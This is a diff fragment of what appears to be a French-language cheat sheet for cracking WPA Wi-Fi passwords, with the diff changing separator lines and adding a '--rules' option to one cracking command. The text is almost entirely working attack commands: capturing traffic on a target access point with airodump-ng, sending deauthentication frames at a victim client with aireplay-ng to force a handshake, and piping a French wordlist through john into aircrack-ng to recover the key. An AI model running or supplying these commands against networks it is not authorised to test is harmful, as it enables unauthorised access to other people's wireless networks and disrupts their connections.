@@ -19,7 +19,7 @@ $ sudo john --stdout -w=/usr/share/john/french.lst | aircrack-ng -b EC:BE:DD:7C:
 $ sudo john --stdout -w=/usr/share/john/french.lst --rules | aircrack-ng -b <MAC BSSID> wpa-01.cap -w -
 
 >@
->@######################################################################################################
+>@########################################################################################################
 >@
 >@* Enregistrement trafic
 >@$ airodump-ng --bssid <MAC BSSID> --channel 1 -w wpa wlan0mon
@@ -28,7 +28,7 @@ $ sudo john --stdout -w=/usr/share/john/french.lst --rules | aircrack-ng -b <MAC
 >@$ sudo aireplay-ng --deauth 5 -a <MAC BSSID> -c <MAX VICTIME> wlan0mon
 >@
 >@* Crack
->@$ sudo john --stdout -w=/usr/share/john/french.lst | aircrack-ng -b <MAC BSSID> wpa-01.cap -w -
+>@$ sudo john --stdout -w=/usr/share/john/french.lst --rules | aircrack-ng -b <MAC BSSID> wpa-01.cap -w -
 >@
->@######################################################################################################
+>@########################################################################################################
 >@
